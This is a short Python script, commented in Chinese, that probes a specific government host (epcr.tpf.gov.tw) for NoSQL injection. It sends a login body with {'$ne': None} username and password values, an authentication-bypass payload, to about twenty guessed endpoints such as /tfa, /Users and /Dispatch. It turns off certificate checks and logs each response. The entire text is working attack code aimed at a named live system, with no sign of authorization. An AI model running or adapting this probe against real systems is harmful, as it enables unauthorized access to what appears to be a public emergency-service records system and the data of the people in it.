import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
# 测试更多端点是否接受 NoSQL 注入 (无需 token 的)
print("=== 其他端点 NoSQL 注入探测 ===")
endpoints=["/tfa","/tfa/login","/tfa/verify","/tfa/otp","/2fa","/twofa",
  "/Branches","/Branches/list","/Users","/Users/list","/Dispatch",
  "/Dispatch/list","/Record","/Records","/dispatch","/login/2fa",
  "/auth","/authenticate","/session","/token","/api/login"]
for ep in endpoints:
    body={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
    try:
        r=s.post(BASE+ep, json=body, timeout=8)
        ct=r.headers.get("Content-Type","")[:30]
        print(f"  POST {ep:22s} -> {r.status_code} [{ct}] {r.text[:50]}")
    except Exception as e:
        print(f"  POST {ep:22s} -> ERR {repr(e)[:30]}")
    time.sleep(0.05)
print("DONE")
